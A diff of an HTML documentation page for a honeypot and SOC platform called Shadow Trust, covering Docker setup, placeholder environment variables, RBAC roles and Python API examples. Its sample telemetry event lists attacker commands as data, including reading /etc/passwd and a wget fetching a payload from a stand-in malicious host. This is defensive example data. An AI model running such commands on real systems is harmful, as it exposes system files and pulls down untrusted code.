@@ -1,167 +1,332 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ShadowTrust - Documentation</title>
-
-    <!-- Google Font -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <!-- AOS CSS for Animations -->
+    <title>Shadow Trust — Documentation</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
-
-    <!-- Global Styles (from landing page) -->
-    <link rel="stylesheet" href="css/landing/landingpage.css">
-    <!-- Specific Docs Styles -->
-    <link rel="stylesheet" href="css/landing/docs.css">
+    <link rel="stylesheet" href="css/landing/landingpage.css?v=3">
+    <link rel="stylesheet" href="css/landing/docs.css?v=3">
 </head>
-
 <body>
 
-    <div class="container">
+<div class="container">
 
-        <!-- NAVBAR -->
-        <nav>
-            <div class="logo">Shadow<span>Trust</span></div>
-            <ul>
-                <li><a href="index.html">Home</a></li>
-                <li><a href="features.html">Features</a></li>
-                <li><a href="architecture.html">Architecture</a></li>
-                <li><a href="docs.html" class="active-link">Docs</a></li>
-                <li><a href="status.html">Status</a></li>
-                <li><a href="usecases.html">Use Cases</a></li>
-            </ul>
-            <a href="contact.html" class="btn">Contact Us</a>
-        </nav>
+    <!-- NAVBAR -->
+    <nav>
+        <div class="logo">Shadow Trust</div>
+        <ul>
+            <li><a href="index.html">Home</a></li>
+            <li><a href="features.html">Features</a></li>
+            <li><a href="architecture.html">Architecture</a></li>
+            <li><a href="docs.html" class="active-link">Docs</a></li>
+            <li><a href="status.html">Status</a></li>
+            <li><a href="usecases.html">Use Cases</a></li>
+        </ul>
+        <a href="login.html" class="btn">Sign In</a>
+    </nav>
 
-        <!-- DOCS HERO -->
-        <section class="docs-hero" data-aos="fade-up">
-            <div class="docs-hero-text">
-                <h1>Shadow Trust <span>Backend Documentation</span></h1>
-                <p>Comprehensive guides for deploying, configuring, and scaling the Shadow Trust cyber range
-                    orchestration backend. Includes API references, module descriptions, and integration steps for
-                    research and analysis workflows.</p>
-                <div class="search-bar">
-                    <input type="text" placeholder="Search documentation... (e.g. 'VM Launch', 'Telemetry Ingestion')">
-                    <button class="btn">Search</button>
-                </div>
+    <!-- DOCS HERO -->
+    <section class="docs-hero" data-aos="fade-up">
+        <div class="docs-hero-text">
+            <span class="section-label">Documentation</span>
+            <h1>Shadow Trust <span>Docs</span></h1>
+            <p>Guides for deploying, configuring, and operating the Shadow Trust SOC platform. Covers Docker setup, API reference, RBAC configuration, honeypot deployment, and AWS integration.</p>
+            <div class="search-bar">
+                <input type="text" placeholder="Search docs... (e.g. 'VM launch', 'RBAC roles', 'Malware pipeline')">
+                <button class="btn btn-primary">Search</button>
             </div>
-            <img src="./docs_hero.png" alt="Documentation Interface Visualization">
-        </section>
+        </div>
+        <div class="docs-terminal">
+            <div class="dt-bar">
+                <span class="dt-dot dt-red"></span>
+                <span class="dt-dot dt-yellow"></span>
+                <span class="dt-dot dt-green"></span>
+                <span class="dt-title">bash — setup.sh</span>
+            </div>
+            <div class="dt-body">
+                <div class="dt-line"><span class="dt-prompt">$</span> git clone Shadow-Trust &amp;&amp; cd Shadow-Trust</div>
+                <div class="dt-line dt-comment"># One-click Docker setup wizard</div>
+                <div class="dt-line"><span class="dt-prompt">$</span> chmod +x setup.sh &amp;&amp; ./setup.sh</div>
+                <div class="dt-line dt-out">  Detecting OS... macOS ✓</div>
+                <div class="dt-line dt-out">  Creating .env files...</div>
+                <div class="dt-line dt-out">  Building 5 Docker images...</div>
+                <div class="dt-line dt-success">✓ All services operational</div>
+                <div class="dt-line dt-info">  Dashboard  → http://localhost:5500</div>
+                <div class="dt-line dt-info">  API Docs   → http://localhost:8000/docs</div>
+                <div class="dt-line"><span class="dt-prompt">$</span> <span class="dt-cursor">█</span></div>
+            </div>
+        </div>
+    </section>
 
-        <!-- DOCS LAYOUT: SIDEBAR + CONTENT -->
-        <section class="docs-layout" data-aos="fade-up">
+    <!-- DOCS LAYOUT -->
+    <section class="docs-layout" data-aos="fade-up">
 
-            <!-- Sidebar Navigation -->
-            <aside class="docs-sidebar">
-                <h3>Getting Started</h3>
-                <ul>
-                    <li><a href="#" class="active-doc">Introduction</a></li>
-                    <li><a href="#">Quickstart Guide</a></li>
-                    <li><a href="#">System Requirements</a></li>
-                    <li><a href="#">Authentication</a></li>
-                </ul>
+        <!-- Sidebar -->
+        <aside class="docs-sidebar">
+            <h3>Getting Started</h3>
+            <ul>
+                <li><a href="#intro" class="active-doc">Introduction</a></li>
+                <li><a href="#quickstart">Quick Start (Docker)</a></li>
+                <li><a href="#env">Environment Variables</a></li>
+            </ul>
 
-                <h3>Core Concepts</h3>
-                <ul>
-                    <li><a href="#">Honeypot Configuration</a></li>
-                    <li><a href="#">Data Ingestion Pipeline</a></li>
-                    <li><a href="#">Alerting Rules Engine</a></li>
-                </ul>
+            <h3>Core Concepts</h3>
+            <ul>
+                <li><a href="#rbac">RBAC & Roles</a></li>
+            </ul>
 
-                <h3>API Reference</h3>
-                <ul>
-                    <li><a href="#">REST API</a></li>
-                    <li><a href="#">WebSocket Streams</a></li>
-                    <li><a href="#">GraphQL Endpoint</a></li>
-                </ul>
-            </aside>
+            <h3>API Reference</h3>
+            <ul>
+                <li><a href="#api-auth">Authentication</a></li>
+                <li><a href="#api-events">Events API</a></li>
+                <li><a href="#api-vm">VM Orchestration</a></li>
+            </ul>
 
-            <!-- Main Content Area -->
-            <main class="docs-content">
-                <div class="content-header">
-                    <h2>Introduction to Shadow Trust Backend</h2>
-                    <span class="badge">v1.0.0</span>
+            <h3>Operations</h3>
+            <ul>
+                <li><a href="#make">Make Commands</a></li>
+            </ul>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="docs-content">
+
+            <div id="intro" class="content-header">
+                <h2>Introduction to Shadow Trust</h2>
+                <span class="badge">v2.0.0</span>
+            </div>
+
+            <p>Shadow Trust is a full-stack, AI-powered Security Operations Center platform that combines honeypot deception, real-time telemetry, malware analysis, and AWS VM orchestration into a single 5-service Docker stack.</p>
+
+            <h3 id="quickstart">Quick Start — Docker (Recommended)</h3>
+            <p>The fastest way to get Shadow Trust running. Requires only Docker Desktop.</p>
+
+            <div class="code-block-wrapper">
+                <div class="code-header">
+                    <span>bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                 </div>
+                <pre><code># 1. Clone the repository
+git clone https://github.com/YOUR_USERNAME/Shadow-Trust.git
+cd Shadow-Trust
 
-                <p>Welcome to the official documentation for the ShadowTrust Threat Intelligence Platform. This guide
-                    will help you understand the backend architecture, async orchestration model, and how to integrate
-                    Shadow Trust with your local dashboard, AWS infrastructure, and Supabase database.</p>
+# 2. Run the one-click setup wizard
+./setup.sh
 
-                <h3>Overview</h3>
-                <p>Shadow Trust backend orchestrates honeypot and analysis VMs from Golden AMIs, ingests telemetry from
-                    attacker sessions, stores events in SQLite and Supabase, and exposes async FastAPI endpoints for VM
-                    lifecycle, session management, and analysis workflows. All VMs are ephemeral and managed securely
-                    via AWS SSM browser sessions.</p>
+# The wizard will:
+#   - Detect your OS (macOS / Linux / Windows)
+#   - Create .env files from templates
+#   - Touch SQLite database files
+#   - Build all 5 Docker images
+#   - Start all services in detached mode
 
-                <div class="code-block-wrapper">
-                    <div class="code-header">
-                        <span>python</span>
-                        <button class="copy-btn">Copy</button>
-                    </div>
-                    <pre><code># Quickstart: Launch a VM via FastAPI
-import requests
+# Access the platform:
+# Dashboard  →  http://localhost:5500
+# API Docs   →  http://localhost:8000/docs
+# MobSF      →  http://localhost:5055
+# Node API   →  http://localhost:3000</code></pre>
+            </div>
 
-resp = requests.post('http://localhost:8000/vm/launch', json={
-    "profile": "kali",
-    "user_id": "demo_user"
+            <h3 id="env">Key Environment Variables</h3>
+            <p>All credentials live in <code>backend/.env</code>. Required fields:</p>
+
+            <div class="code-block-wrapper">
+                <div class="code-header">
+                    <span>env</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><code># Core (required)
+SECRET_KEY=your-jwt-secret-key
+SUPABASE_URL=https://YOUR_PROJECT.supabase.co
+SUPABASE_KEY=your-service-role-key
+
+# Email alerts (optional)
+SMTP_HOST=smtp.gmail.com
+SMTP_USER=your@gmail.com
+SMTP_PASS=your-app-password
+
+# WhatsApp alerts (optional)
+TWILIO_ACCOUNT_SID=ACxxxxxxxx
+TWILIO_AUTH_TOKEN=your-token
+
+# AWS VM orchestration (optional)
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_REGION=us-east-1</code></pre>
+            </div>
+
+            <h3 id="rbac">RBAC — Roles & Access Levels</h3>
+            <p>Shadow Trust uses a 6-tier role model with clearance levels. Set the first Super Admin in Supabase:</p>
+
+            <div class="code-block-wrapper">
+                <div class="code-header">
+                    <span>sql</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><code>-- In Supabase SQL Editor: promote first user to super_admin
+UPDATE users SET role = 'super_admin', clearance_level = 3
+WHERE email = 'your@email.com';</code></pre>
+            </div>
+
+            <div class="info-alert">
+                <strong>Roles:</strong> super_admin (3) → overseer (3) → auditor (2) → analyst (2) → specialist (2) → operative (1). Higher clearance unlocks VM lab, malware pipeline, and admin panel.
+            </div>
+
+            <h3 id="api-auth">Authentication API</h3>
+            <p>All API calls require a JWT Bearer token obtained from the login endpoint.</p>
+
+            <div class="code-block-wrapper">
+                <div class="code-header">
+                    <span>python</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><code>import requests
+
+# Login and get JWT token
+resp = requests.post('http://localhost:8000/api/v1/auth/login', json={
+    "username": "operator@example.com",
+    "password": "your-password"
 })
-print(resp.json())
+token = resp.json()["access_token"]
+headers = {"Authorization": f"Bearer {token}"}</code></pre>
+            </div>
 
-# Ingest telemetry event
+            <h3 id="api-events">Ingest Telemetry Event</h3>
+
+            <div class="code-block-wrapper">
+                <div class="code-header">
+                    <span>python</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><code># Ingest a honeypot telemetry event
 event = {
-    "attacker_ip": "192.168.1.10",
-    "timestamp": "2026-02-27T12:00:00Z",
+    "attacker_ip": "45.33.32.156",
+    "timestamp": "2026-03-20T12:00:00Z",
     "protocol": "ssh",
-    "honeypot_type": "linux",
-    "session_id": "sess123",
-    "commands": ["ls", "cat /etc/passwd"],
+    "honeypot_type": "cowrie",
+    "session_id": "sess_abc123",
+    "commands": ["ls -la", "cat /etc/passwd", "wget http://malicious.site/payload"],
     "uploaded_files": [],
-    "ports_scanned": [22, 80],
-    "geoip": "IN",
-    "risk_score": 7.5,
+    "ports_scanned": [22, 80, 443],
+    "geoip": "CN",
+    "risk_score": 8.5,
     "raw_payload": "..."
 }
-requests.post('http://localhost:8000/events', json=event)
-</code></pre>
+
+requests.post('http://localhost:8000/api/v1/events', json=event, headers=headers)</code></pre>
+            </div>
+
+            <h3 id="api-vm">Launch Analysis VM</h3>
+
+            <div class="code-block-wrapper">
+                <div class="code-header">
+                    <span>python</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                 </div>
+                <pre><code># Launch an AWS EC2 analysis VM
+resp = requests.post('http://localhost:8000/api/v1/vm/launch', json={
+    "profile": "kali",
+    "session_id": "sess_abc123",
+    "user_id": "analyst_01"
+}, headers=headers)
 
-                <div class="info-alert">
-                    <strong>Note:</strong> All backend endpoints are async and require proper authentication. Refer to
-                    the API docs for endpoint details and request formats.
+vm = resp.json()
+print(f"VM launched: {vm['instance_id']} — access via Guacamole")
+
+# Terminate when done
+requests.post(f'http://localhost:8000/api/v1/vm/terminate/{vm["instance_id"]}',
+              headers=headers)</code></pre>
+            </div>
+
+            <h3 id="make">Make Commands</h3>
+
+            <div class="code-block-wrapper">
+                <div class="code-header">
+                    <span>bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                 </div>
+                <pre><code>make setup       # First-time setup (same as ./setup.sh)
+make up          # Start containers (no rebuild)
+make down        # Stop all containers
+make rebuild     # Rebuild images + restart
+make logs        # Tail all container logs
+make logs-backend  # Backend logs only
+make status      # Show container status
+make shell-backend # Shell into FastAPI container
+make clean       # Remove containers + images
+make nuke        # ⚠ Remove everything including volumes</code></pre>
+            </div>
 
-                <h3>Next Steps</h3>
-                <div class="next-steps-grid">
-                    <a href="#" class="step-card">
-                        <h4>Quickstart Guide</h4>
-                        <p>Deploy your first honeypot in under 5 minutes.</p>
-                    </a>
-                    <a href="#" class="step-card">
-                        <h4>REST API Docs</h4>
-                        <p>Integrate threat feeds directly into your SIEM.</p>
-                    </a>
-                </div>
-            </main>
+            <div class="next-steps-grid">
+                <a href="architecture.html" class="step-card">
+                    <h4>🏗️ Architecture</h4>
+                    <p>Understand the full data flow from honeypot to dashboard.</p>
+                </a>
+                <a href="features.html" class="step-card">
+                    <h4>✨ Features</h4>
+                    <p>Explore every capability Shadow Trust delivers.</p>
+                </a>
+                <a href="http://localhost:8000/docs" target="_blank" class="step-card">
+                    <h4>📚 Live API Docs</h4>
+                    <p>Interactive Swagger UI for all 19 API endpoint groups.</p>
+                </a>
+                <a href="status.html" class="step-card">
+                    <h4>📡 System Status</h4>
+                    <p>Check the health of all backend services.</p>
+                </a>
+            </div>
 
-        </section>
+        </main>
+    </section>
 
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-grid">
+        <div class="footer-brand">
+            <span class="logo">Shadow Trust</span>
+            <p>AI-powered Security Operations Center with honeypot deception, malware analysis, and real-time threat intelligence.</p>
+        </div>
+        <div class="footer-col">
+            <h4>Platform</h4>
+            <ul>
+                <li><a href="features.html">Features</a></li>
+                <li><a href="architecture.html">Architecture</a></li>
+                <li><a href="usecases.html">Use Cases</a></li>
+                <li><a href="docs.html">Documentation</a></li>
+                <li><a href="status.html">System Status</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h4>Access</h4>
+            <ul>
+                <li><a href="login.html">Sign In</a></li>
+                <li><a href="register.html">Register</a></li>
+                <li><a href="dashboard.html">Dashboard</a></li>
+                <li><a href="http://localhost:8000/docs" target="_blank">API Docs (Swagger)</a></li>
+            </ul>
+        </div>
     </div>
+    <div class="footer-bottom">
+        <p>© 2026 Shadow Trust. All Rights Reserved.</p>
+        <div class="footer-status"><span class="dot"></span> All Systems Operational</div>
+    </div>
+</footer>
 
-    <footer>
-        © 2026 Shadow Trust Project. All Rights Reserved.
-    </footer>
+<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+<script>
+    AOS.init({ duration: 750, once: true, offset: 80 });
 
-    <!-- AOS Animation Script Iteration -->
-    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-    <script>
-        AOS.init({
-            duration: 800,
-            once: true,
-            offset: 100
+    function copyCode(btn) {
+        const code = btn.closest('.code-block-wrapper').querySelector('code').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+            btn.textContent = 'Copied!';
+            setTimeout(() => btn.textContent = 'Copy', 2000);
         });
-    </script>
+    }
+</script>
 </body>
-
 </html>
